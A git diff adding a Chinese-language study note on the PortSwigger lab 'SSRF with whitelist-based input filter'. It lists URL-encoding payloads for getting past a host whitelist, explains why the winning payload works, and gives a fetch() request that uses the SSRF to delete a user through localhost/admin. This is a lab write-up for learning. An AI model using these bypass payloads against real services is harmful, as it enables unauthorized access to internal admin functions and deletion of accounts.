@@ -176,6 +176,80 @@ function encodeSingleStringToURIComponent(str) {
 - IP 的不同表達方式
   還不夠了解，之後需要來補一下這方面的知識
 
+## Lab: SSRF with whitelist-based input filter
+
+| Dimension | Description                                                                       |
+| --------- | --------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters |
+| Lab       | https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter          |
+
+先嘗試
+
+```js
+encodeURIComponent(`http://localhost/admin`);
+encodeURIComponent(`http://localhost/admin?fake=http://stock.weliketoshop.net`);
+encodeURIComponent(
+  `http://stock.weliketoshop.net:fakepassword@localhost/admin`,
+);
+encodeURIComponent(`http://localhost/admin#stock.weliketoshop.net`);
+encodeURIComponent(`http://localhost/admin#http://stock.weliketoshop.net`);
+encodeURIComponent(`http://localhost#@stock.weliketoshop.net/admin`);
+encodeURIComponent(`http://stock.weliketoshop.net@localhost/admin`);
+encodeURIComponent(`http://stock.weliketoshop.net.localhost/admin`);
+encodeURIComponent(
+  `http://stock.weliketoshop.net%2f..%2f..%2flocalhost%2fadmin`,
+);
+encodeURIComponent(`http://stock.weliketoshop.net%2523@localhost/admin`);
+encodeURIComponent(`http://localhost%2523/admin@stock.weliketoshop.net`);
+function encodeStringToURIComponent(str) {
+  return str
+    .split("")
+    .map((char) => "%" + char.charCodeAt(0).toString(16))
+    .join("");
+}
+encodeStringToURIComponent("http://localhost/admin");
+encodeStringToURIComponent(
+  `http://localhost/admin#http://stock.weliketoshop.net`,
+);
+encodeStringToURIComponent(
+  `http://stock.weliketoshop.net:fakepassword@localhost/admin`,
+);
+```
+
+=> `"External stock check host must be stock.weliketoshop.net"`
+
+最終嘗試
+
+```js
+encodeURIComponent(`http://localhost%23@stock.weliketoshop.net/admin`);
+```
+
+成功看到 `http://localhost/admin` 回傳的 response，推測是
+
+1. `http://localhost%23@stock.weliketoshop.net/admin` => host 是 stock.weliketoshop.net，通過檢查 ✅
+2. URL Decode 之後 `http://localhost#@stock.weliketoshop.net/admin`
+3. `#@stock.weliketoshop.net` 被視為 fragment
+4. `/admin` 是合法的 path
+5. 最終請求 `http://localhost/admin`
+
+之後再
+
+```js
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  body: `stockApi=${encodeURIComponent(`http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos`)}`,
+  method: "POST",
+  mode: "cors",
+  credentials: "include",
+});
+```
+
+後來回頭看官方解答，真的很精妙 `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
+
+`localhost:80%2523` => 雙重 URL Decode 之後 => `localhost:80#` => 利用 `localhost:80` 巧妙的跟 `username:password` 匹配
+
 ## 參考資料
 
 - https://portswigger.net/web-security/ssrf
